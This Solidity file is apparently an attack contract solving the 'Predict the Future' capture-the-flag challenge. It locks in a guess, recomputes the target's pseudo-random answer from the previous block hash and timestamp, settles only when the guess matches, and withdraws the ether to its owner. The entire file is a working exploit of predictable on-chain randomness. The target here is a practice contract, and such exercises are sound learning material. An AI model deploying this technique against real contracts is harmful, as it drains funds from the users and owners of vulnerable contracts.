pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";


contract AttackPredictFuture {
    address owner;

    function AttackPredictFuture () public {
        owner = msg.sender;
    }

    function () public payable {}

    function lockInGuess(address _challenge, uint8 n) public payable {
        require(msg.value == 1 ether);

        PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_challenge);
        challenge.lockInGuess.value(msg.value)(n);
    }

    function guess(address _challenge, uint8 n) public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        if (answer == n) {
            PredictTheFutureChallenge challenge = PredictTheFutureChallenge(_challenge);
            challenge.settle();
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
